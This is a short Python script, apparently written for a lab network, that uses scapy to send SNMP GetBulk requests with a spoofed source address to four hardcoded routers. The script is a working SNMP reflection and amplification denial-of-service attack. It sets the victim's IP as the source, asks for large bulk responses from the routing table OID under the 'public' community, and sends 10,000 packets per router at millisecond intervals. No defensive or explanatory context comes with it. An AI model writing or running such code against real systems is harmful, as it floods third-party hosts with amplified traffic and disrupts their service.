from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.snmp import SNMP, SNMPvarbind, SNMPbulk

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def snmp_attack_vlan(target_ip):
    print(f"Starting SNMP attack for '{target_ip}'")
    r1 = "192.168.20.46"
    r2 = "192.168.20.62"
    r3 = "192.168.20.78"
    r4 = "192.168.20.110"
    dst_ips = [r1, r2, r3, r4]

    oid = "1.3.6.1.2.1.4.24"
    snmp_community = "public"
    snmp_version = 1  # v2c
    snmp_bulk_pdu = SNMPbulk(
        id=RandInt(),
        non_repeaters=0,
        max_repetitions=1000,
        varbindlist=[SNMPvarbind(oid=oid)],
    )
    snmp_packet = SNMP(
        version=snmp_version, community=snmp_community, PDU=snmp_bulk_pdu
    )

    attack_packets = []
    for dst_ip in dst_ips:
        udp_packet = UDP(sport=RandShort(), dport=161)
        ip_packet = IP(src=target_ip, dst=dst_ip) / udp_packet / snmp_packet
        ip_packet.show()
        attack_packets.append(ip_packet)

    send(attack_packets, count=10000, inter=0.001)


def main() -> None:
    if len(sys.argv) != 2:
        print("Usage: %s target" % (sys.argv[0]))
        sys.exit(0)

    target = str(sys.argv[1])
    snmp_attack_vlan(target)


if __name__ == "__main__":
    main()
